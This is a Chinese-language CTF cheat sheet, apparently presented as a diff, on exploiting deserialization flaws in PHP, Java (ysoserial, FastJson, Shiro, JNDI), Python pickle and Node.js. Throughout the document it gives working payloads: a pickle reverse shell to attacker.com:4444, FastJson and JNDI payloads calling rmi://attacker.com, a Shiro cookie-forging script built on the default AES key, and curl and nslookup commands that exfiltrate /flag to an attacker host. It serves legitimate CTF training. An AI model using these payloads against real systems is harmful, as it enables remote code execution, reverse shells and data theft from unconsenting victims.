@@ -1,0 +1,546 @@
+反序列化漏洞                              
+  【0】核心认知：反序列化漏洞的本质
+  【1】侦查阶段：识别攻击面
+  【2】PHP 反序列化 · 完整攻击链路
+  【3】Java 反序列化 · 完整攻击链路
+  【4】Python Pickle 反序列化
+  【5】Node.js 反序列化
+  【6】POP 链构造通用方法论
+  【7】绕过技巧大全
+  【8】实战执行 SOP（标准作业程序）
+  【9】工具速查表
+  【10】典型题型 & 解法模板
+
+
+【0】核心认知：反序列化漏洞的本质
+
+
+  本质一句话：
+  「攻击者控制了被反序列化的数据，程序在恢复对象时自动调用了危险方法」
+
+  三个必要条件：
+    1. 入口：存在反序列化函数且输入可控             
+    2. 载体：代码中存在含危险操作的类（Gadget）     
+    3. 触发：从反序列化入口到危险操作有可达路径     
+
+  解题本质 = 找入口 + 找Gadget + 构造触发链 + 执行Payload
+
+
+
+【1】侦查阶段：识别攻击面
+
+
+  ▶ 1.1 快速判断语言/框架
+  信号                          推断
+  ──────────────────────────    ───────────────────
+  Cookie 含 PHPSESSID           PHP
+  响应头 X-Powered-By: PHP/x    PHP
+  .jsp / .do / .action 后缀    Java
+  响应头含 Apache Tomcat/JBoss  Java
+  Set-Cookie: session=eyJ...   Python Flask (JWT/Pickle)
+  package.json 暴露             Node.js
+
+  ▶ 1.2 寻找序列化数据特征
+  PHP 序列化格式：
+    O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:18;}
+    特征：O:数字:"类名": / a: / s: / i: / b:
+
+  PHP base64 后特征：
+    Tzo0OiJVc2VyIjoy  （T开头常见）
+
+  Java 序列化格式：
+    二进制：AC ED 00 05（魔数）
+    base64：rO0AB...
+    特征：rO0 开头 base64 几乎必是 Java 序列化
+
+  Python Pickle：
+    通常以 \x80\x02 或 \x80\x04 开头
+    base64后：gASV... 或 gAJV...
+
+  Node.js node-serialize：
+    {"rce":"_$$ND_FUNC$$_function(){...}()"}
+
+  ▶ 1.3 数据传输位置排查清单
+    □ Cookie 字段（最高频）
+    □ GET/POST 参数
+    □ HTTP Header（User-Agent/Referer/X-Custom）
+    □ 文件上传内容
+    □ XML/JSON 请求体（Java XMLDecoder / Jackson）
+    □ Session 存储（文件/Redis/Memcached）
+    □ 数据库读取后直接反序列化
+
+
+
+【2】PHP 反序列化 · 完整攻击链路
+
+
+  ▶ 2.1 Magic方法触发时机
+  __wakeup()     反序列化时立即调用
+  __destruct()   对象销毁时调用（脚本结束时）
+  __toString()   对象被当作字符串时调用
+  __get()        访问不可访问属性时
+  __set()        给不可访问属性赋值时
+  __call()       调用不可访问方法时
+  __invoke()     对象被当作函数调用时
+
+  ▶ 2.2 PHP POP链分析步骤
+  Step 1: 找入口魔术方法
+    → unserialize() 调用后第一个触发的是 __wakeup() 或 __destruct()
+    → 把它作为链头
+
+  Step 2: 追踪调用链
+    → 在链头方法里找：有没有调用其他方法/访问属性/类型转换
+    → 每一步找「可以被我们控制的类」来接收
+
+  Step 3: 找链尾危险操作
+    → system() / exec() / passthru()    → RCE
+    → file_get_contents() / file_put_contents()  → 文件读写
+    → include() / require()             → 文件包含
+    → eval()                            → 代码执行
+    → unlink()                          → 文件删除
+
+  Step 4: 反向构造 Payload
+
+  ▶ 2.3 PHP 序列化 Payload 编写模板
+  // 本地写好各个类（复制源码，只保留属性定义）
+  class A {
+      public $obj;
+  }
+  class B {
+      public $cmd;
+      public function __toString() {
+          return system($this->cmd);
+      }
+  }
+
+  $b = new B();
+  $b->cmd = "cat /flag";
+
+  $a = new A();
+  $a->obj = $b;   // A的某处会把obj转为字符串，触发B的__toString
+
+  echo serialize($a);
+  // 输出即为 Payload，URL编码后提交
+
+  ▶ 2.4 __wakeup 绕过（CVE-2016-7124）
+    条件：PHP < 5.6.25 或 PHP < 7.0.10
+    原理：序列化字符串中对象属性个数 > 实际个数，__wakeup 被跳过
+    例：O:4:"Evil":2:{...}  →  O:4:"Evil":3:{...}
+                                              ↑ 改大
+
+  ▶ 2.5 属性访问控制与序列化格式
+  public    →  s:4:"name";
+  protected →  s:7:"\x00*\x00name";   (含%00*%00)
+  private   →  s:10:"\x00ClassName\x00name";
+  !! 提交时注意 %00 需要 URL 编码，或直接用 raw bytes
+
+  ▶ 2.6 Phar 反序列化（文件操作触发）
+    适用场景：有文件操作函数（file_exists/fopen等），但没有直接 unserialize()
+    原理：phar:// 伪协议读取 phar 文件时自动触发反序列化
+
+    制作 Phar 步骤：
+    ①  php.ini 中 phar.readonly=0
+    ②  编写：
+        $phar = new Phar("evil.phar");
+        $phar->startBuffering();
+        $phar->setStub("<?php __HALT_COMPILER(); ?>");
+        $phar->setMetadata($payload_object);  // 放入恶意对象
+        $phar->addFromString("test.txt","test");
+        $phar->stopBuffering();
+    ③  上传 evil.phar（改后缀绕过检测）
+    ④  触发：file_exists("phar://upload/evil.jpg")
+
+  ▶ 2.7 Session 反序列化
+    PHP Session 三种引擎格式不同：
+    php          →  key|序列化数据
+    php_serialize →  序列化整个数组
+    php_binary   →  二进制key+序列化数据
+
+    攻击：当 session.serialize_handler 在写入和读取时不一致
+    例：写入用 php_serialize，读取用 php → 注入 |O:4:"Evil":0:{}
+        读取时 | 前被当作 key，| 后被反序列化
+
+
+
+【3】Java 反序列化 · 完整攻击链路
+  ▶ 3.1 Java 反序列化特征识别
+    base64(rO0ABXNy...) = AC ED 00 05 序列化魔数
+    服务端用 ObjectInputStream.readObject() 反序列化
+    常见入口：T3协议(WebLogic) / HTTP Body / RMI / JMX
+
+  ▶ 3.2 常用 Gadget Chain（按框架）
+  Commons Collections 3.x (CC1/CC2/CC3...)
+    → InvokerTransformer 链式调用到 Runtime.exec()
+    → 适用：Commons Collections < 3.2.2
+
+  Commons Collections 4.x (CC4)
+    → 使用 TrAXFilter + TemplatesImpl
+
+  Spring Framework
+    → Spring1: org.springframework.core.SerializableTypeWrapper
+    → Spring4: 利用 ObjectFactoryDelegatingInvocationHandler
+
+  Groovy
+    → ConversionHandler → MethodClosure → Runtime.exec()
+
+  WebLogic 专用
+    → CVE-2015-4852: Commons Collections
+    → CVE-2016-0638: StreamMessageImpl（绕过黑名单）
+    → CVE-2018-2628: T3协议 JtaTransactionManager
+    → CVE-2019-2725: AsyncResponseService XMLDecoder
+    → CVE-2020-14882: console 路径绕过 RCE
+
+  ▶ 3.3 ysoserial 使用
+    工具：https://github.com/frohoff/ysoserial
+
+    // 生成 Payload
+    java -jar ysoserial.jar CommonsCollections1 "命令" > payload.ser
+
+    // base64 输出（用于 HTTP 传输）
+    java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/$(cat /flag|base64)" | base64 | tr -d '\n'
+
+    // 常用 Gadget 名称
+    CommonsCollections1~7  /  Spring1  /  Spring4
+    Groovy1  /  JRMPClient  /  URLDNS
+
+  ▶ 3.4 FastJson 反序列化
+    FastJson 特征：@type 字段
+    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com/Exploit","autoCommit":true}
+
+    版本与对应绕过：
+    < 1.2.24   → 直接利用 JdbcRowSetImpl / TemplatesImpl
+    < 1.2.47   → 利用缓存绕过黑名单（最常见CTF版本）
+    < 1.2.68   → Throwable + AutoCloseable 绕过
+    bypass payload 1.2.47:
+    {
+      "a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
+      "b":{"@type":"com.sun.rowset.JdbcRowSetImpl",
+           "dataSourceName":"rmi://attacker.com/Evil",
+           "autoCommit":true}
+    }
+
+  ▶ 3.5 Shiro 反序列化（CTF 高频）
+    特征：Cookie 中含 rememberMe 字段
+    原理：AES 加密后的序列化数据，解密后 readObject()
+
+    利用步骤：
+    ① 获取 AES Key（默认 kPH+bIxk5D2deZiIxcaaaA== 或爆破）
+    ② 用 ysoserial 生成 payload.ser
+    ③ AES-CBC 加密（key + iv）
+    ④ base64 → 填入 rememberMe Cookie
+
+    工具：shiro_attack / ysoserial + 自写加密脚本
+
+    Python 加密脚本模板：
+    from Crypto.Cipher import AES
+    import base64, os
+
+    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
+    iv  = os.urandom(16)
+    BS  = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+
+    with open("payload.ser","rb") as f:
+        data = pad(f.read())
+
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted = base64.b64encode(iv + cipher.encrypt(data))
+    print(encrypted.decode())
+
+  ▶ 3.6 JNDI 注入（配合反序列化）
+    常见触发点：Log4j2(CVE-2021-44228) / FastJson / XStream
+    流程：
+    ① 搭建恶意 RMI/LDAP 服务（marshalsec）
+       java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit"
+    ② 在攻击服务器放 Exploit.class
+    ③ 触发：${jndi:rmi://attacker.com/Exploit}
+
+
+
+【4】Python Pickle 反序列化
+
+
+  ▶ 4.1 识别特征
+    pickle.loads() / cPickle.loads()
+    Cookie/session 中含 base64 数据
+    Python 框架（Flask/Django）session 异常
+
+  ▶ 4.2 直接 RCE Payload
+  ─────────────────────────────────────────────────
+  import pickle, os, base64
+
+  class Exploit(object):
+      def __reduce__(self):
+          return (os.system, ("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'",))
+
+  payload = base64.b64encode(pickle.dumps(Exploit()))
+  print(payload.decode())
+  ─────────────────────────────────────────────────
+
+  ▶ 4.3 Pickle opcode 手写（绕过沙盒）
+    R 指令 = 调用可调用对象
+    手写 opcode 可以绕过对 __reduce__ 的检测：
+    import pickletools
+    payload = b"cos\nsystem\n(S'id'\ntR."
+    # cos\nsystem\n  → 导入 os.system
+    # (S'id'\n       → 压入参数 'id'
+    # tR.            → tuple + REDUCE + STOP
+
+  ▶ 4.4 Flask Session 伪造（含 Pickle）
+    某些 Flask 应用用 Pickle 序列化 session，存在 cookie 中
+    session 结构：base64(data).base64(timestamp).sign
+    工具：flask-unsign
+    flask-unsign --decode --cookie "eyJ..."
+    flask-unsign --sign --cookie "{'admin':True}" --secret "secret_key"
+
+
+
+【5】Node.js 反序列化
+
+
+  ▶ 5.1 node-serialize 漏洞（CVE-2017-5941）
+    特征：使用 node-serialize 库，数据中含 _$$ND_FUNC$$_
+    Payload：
+    {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,r){require('http').get('http://attacker.com/?r='+Buffer.from(r).toString('base64'));})}()"}
+
+  ▶ 5.2 原型链污染（Prototype Pollution）
+    攻击对象：lodash.merge / jQuery.extend / JSON.parse 链路
+    Payload：{"__proto__":{"isAdmin":true}}
+    CTF 常见结合点：
+    → 污染后影响权限判断
+    → 污染 shell 选项触发 RCE（vm2逃逸）
+
+
+
+【6】POP 链构造通用方法论
+
+
+  ▶ 6.1 链构造思维模型（正向分析）
+  ─────────────────────────────────────────────────
+  [入口层]  unserialize() / readObject()
+      ↓
+  [触发层]  Magic方法 / readResolve() / finalize()
+      ↓
+  [传播层]  属性赋值 / 方法调用 / 类型转换
+      ↓  （可能多层）
+  [执行层]  Runtime.exec() / system() / eval()
+  ─────────────────────────────────────────────────
+
+  ▶ 6.2 链构造思维模型（反向分析，更高效）
+  Step 1: 找「危险 sink」（命令执行/文件操作）
+  Step 2: 向上追溯谁调用了这个 sink
+  Step 3: 继续向上追溯，找到可以从魔术方法/readObject 到达的路径
+  Step 4: 用我们控制的类属性填充中间步骤
+
+  ▶ 6.3 链构造实战注意事项
+    ① 类必须全部可序列化（PHP 无限制，Java 需实现 Serializable）
+    ② 属性类型必须匹配（字符串/对象/数组）
+    ③ 注意 PHP 中 private/protected 属性的字节前缀
+    ④ Java 中注意 serialVersionUID 版本匹配
+    ⑤ 循环引用要小心，可能导致无限递归
+
+  ▶ 6.4 图形化辅助工具
+    PHP：phpggc  (https://github.com/ambionics/phpggc)
+    Java：ysoserial / gadgetinspector
+
+
+
+【7】绕过技巧大全
+
+
+  ▶ 7.1 PHP 过滤绕过
+  ─────────────────────────────────────────────────
+  过滤 __wakeup      → CVE-2016-7124，修改属性数量
+  过滤 O:           → 使用 C:（自定义序列化）或大小写 O:
+  过滤 system/exec  → passthru / shell_exec / \x73ystem / base64_decode
+  过滤对象关键字    → 用 a:（数组）包装，某些情况下等效
+  过滤特定类名      → 寻找别名、继承类
+  字符逃逸          → 利用字符串处理函数改变序列化长度
+  ─────────────────────────────────────────────────
+
+  ▶ 7.2 PHP 字符逃逸（高频考点）
+    原理：过滤前后字符串长度发生变化，导致序列化结构被破坏重组
+    两种方向：
+
+    【增多型】过滤把1个字符变N个（如 o → oo）
+    → 构造：在可控字符串中填充 N-1 个 'o'，后面跟序列化注入片段
+    → 序列化数据中原来的引号被"挤出"结构，注入的数据被当作真实数据解析
+
+    【减少型】过滤把N个字符删除（如移除 evil）
+    → 反向操作，让原有数据吃掉定界符，后面的数据顶进来
+
+    调试方法：
+    用 var_dump(unserialize($data)) 逐步验证每步是否生效
+
+  ▶ 7.3 Java 黑名单绕过
+    WebLogic 黑名单绕过：
+    → 换用不在黑名单的 Gadget（如 JtaTransactionManager）
+    → 使用二次反序列化（IRGC / SignedObject）
+    → CVE-2020-2555 / CVE-2020-2883：自定义序列化绕过
+
+    FastJson 黑名单绕过：
+    → 大小写混淆：@Type  /  利用 Unicode：\u0040type
+    → 1.2.47 缓存绕过（最稳定）
+
+  ▶ 7.4 命令执行结果外带
+    当服务器没有回显时：
+    ① DNS 外带：nslookup $(cat /flag|base64).attacker.com
+    ② HTTP 外带：curl "http://attacker.com/?d=$(cat /flag|base64)"
+    ③ 写文件：echo RCE > /var/www/html/result.txt
+    ④ Blind 读取：sleep $(cat /flag | wc -c) （时间盲）
+    工具：ceye.io / dnslog.cn / interactsh
+
+
+
+【8】实战执行 SOP（标准作业程序）
+
+
+  ── 第一阶段：情报收集（5分钟内完成）──
+  □ 1. 识别语言框架（响应头/Cookie/后缀）
+  □ 2. 找序列化数据特征（Cookie/POST body/URL）
+  □ 3. 确认序列化类型（PHP/Java/Pickle）
+  □ 4. 搜集源码（是否有代码审计入口/附件下载）
+
+  ── 第二阶段：代码审计（有源码）──
+  □ 5. 全局搜索 unserialize / readObject / pickle.loads
+  □ 6. 追踪参数来源（是否用户可控）
+  □ 7. 收集所有类定义，建立类图
+  □ 8. 找 Magic 方法入口（__wakeup/__destruct）
+  □ 9. 反向追踪危险函数，构造 POP 链
+  □ 10. 编写 Payload 生成脚本
+
+  ── 第二阶段：黑盒测试（无源码）──
+  □ 5. 用已知 CVE Payload 测试（ysoserial / phpggc）
+  □ 6. 用 URLDNS gadget 探测 Java 版本/可用链
+  □ 7. 用 dnslog 验证是否存在漏洞
+  □ 8. 逐步升级到 RCE Payload
+
+  ── 第三阶段：Payload 构造 ──
+  □ 11. 本地搭建同版本环境测试
+  □ 12. 构造基础 Payload，先测试能否触发（用 sleep 5）
+  □ 13. 确认执行后，替换为读 flag 命令
+  □ 14. 处理编码（url-encode / base64 / 原始二进制）
+  □ 15. 注意 Content-Type 和请求方式
+
+  ── 第四阶段：提交获取 Flag ──
+  □ 16. 用 dnslog 或写文件外带 flag
+  □ 17. flag 可能在：/flag / /flag.txt / /root/flag / 环境变量
+  □ 18. 常用命令：find / -name "flag*" 2>/dev/null
+
+
+
+【9】工具速查表
+
+
+  工具名            语言/用途           安装/使用
+  ──────────────────────────────────────────────────────────────────────
+  ysoserial         Java 序列化 Payload  java -jar ysoserial.jar [Chain] [cmd]
+  phpggc            PHP Gadget 链生成   ./phpggc [框架/链名] RCE exec 'cmd'
+  shiro_attack      Shiro 漏洞利用      GUI工具，填入URL和key
+  marshalsec        Java RMI/LDAP服务   java -cp marshalsec.jar ...RMIRefServer
+  gadgetinspector   自动分析Java Gadget 自动化挖掘 readObject 路径
+  flask-unsign      Flask Session伪造   pip install flask-unsign
+  pickletools       Python Pickle调试   import pickletools; pickletools.dis(data)
+  Burp Suite        HTTP拦截/重放       必备，注意 Hex 视图处理二进制序列化
+  ceye.io           DNSlog平台          申请账号后使用专属子域名
+  interactsh        OOB检测             interactsh-client -server ...
+  ──────────────────────────────────────────────────────────────────────
+
+  ▶ phpggc 常用命令
+  # 列出所有可用链
+  ./phpggc -l
+
+  # 生成 Laravel RCE Payload
+  ./phpggc Laravel/RCE1 system "cat /flag" -b
+
+  # 生成 Symfony Payload（base64）
+  ./phpggc Symfony/RCE4 exec "id" -b
+
+  # 生成 Phar 文件
+  ./phpggc -p phar Laravel/RCE1 system "id" -o evil.phar
+
+
+
+【10】典型题型 & 解法模板
+
+
+  ■ 题型 A：PHP 简单 Magic 方法 + 直接 RCE
+  ──────────────────────────────────────────
+  特征：源码简单，2-3个类，存在直接调用危险函数
+  解法：
+  1. 读源码找 __destruct/__wakeup 中的危险操作
+  2. 直接构造对象，echo serialize($obj) 得 payload
+  3. base64 后填入 Cookie 或 POST
+
+  ■ 题型 B：PHP 多级 POP 链
+  ──────────────────────────
+  特征：源码复杂，5+个类，危险函数深藏
+  解法：
+  1. 建立类关系图（手绘或用 xmind）
+  2. 标记所有魔术方法入口
+  3. 标记所有危险函数 sink
+  4. 连线找路径（通常唯一或少数）
+  5. 逐层实例化，从内向外序列化
+
+  ■ 题型 C：PHP 字符逃逸
+  ──────────────────────
+  特征：序列化数据经过字符串过滤函数处理后反序列化
+  解法：
+  1. 识别过滤规则（替换/删除了什么，增减多少字符）
+  2. 计算需要填充多少个触发字符才能"挤出"注入位置
+  3. 手动构造或写脚本计算偏移
+  4. 拼接注入的序列化片段（注意引号、分号、大括号）
+
+  ■ 题型 D：Phar 文件上传触发
+  ──────────────────────────
+  特征：有文件上传，有 phar:// 可达的文件操作
+  解法：
+  1. 生成含恶意对象的 phar 文件
+  2. 改后缀（.jpg/.png/.gif 绕检测）
+  3. 触发服务器对该文件调用 file_exists/fopen 等
+  4. 使用 phar:// 路径触发
+
+  ■ 题型 E：Java Shiro 反序列化
+  ──────────────────────────────
+  特征：登录页含 rememberMe Cookie
+  解法：
+  1. 用工具探测 AES Key（默认 key 或读取配置）
+  2. 确认可用 Gadget（工具自动探测或手动试）
+  3. 生成 ysoserial payload → AES 加密 → base64
+  4. 填入 rememberMe 发送请求
+
+  ■ 题型 F：FastJson 注入
+  ────────────────────────
+  特征：POST/API接口接受 JSON，@type 字段或报错信息含FastJson
+  解法：
+  1. 确认 FastJson 版本（版本号在报错信息里）
+  2. 选择对应 Bypass 策略（见 3.4）
+  3. 搭建 RMI/LDAP 服务 → 触发 JNDI 回连
+  4. 或使用 TemplatesImpl 本地执行链（不出网时）
+
+
+
+  附录：常见坑点 & Debug 技巧
+
+
+  坑1：URL 编码问题
+    + 号在 URL 中是空格，base64 含 + 时需编码为 %2B
+    = 号需编码为 %3D
+    建议全部 rawurlencode() 或使用 Burp 的 URL编码功能
+
+  坑2：PHP 中 protected/private 属性
+    %00 字节在 Burp 的 Raw 模式下不可见，要切换 Hex 视图确认
+
+  坑3：Java Payload 二进制传输
+    HTTP 传输时确认 Content-Type: application/octet-stream
+    或者 base64 后确认服务端正确 base64 解码
+
+  坑4：命令执行无回显
+    先用 sleep 5 确认执行，再用 curl dnslog 外带数据
+
+  坑5：Shiro Key 不对
+    默认 Key 有多个，工具通常内置列表自动爆破
+    也可尝试读取配置：shiro.ini / application.properties
+
+  坑6：PHP 版本影响魔术方法
+    PHP8 移除了部分行为，注意题目环境版本
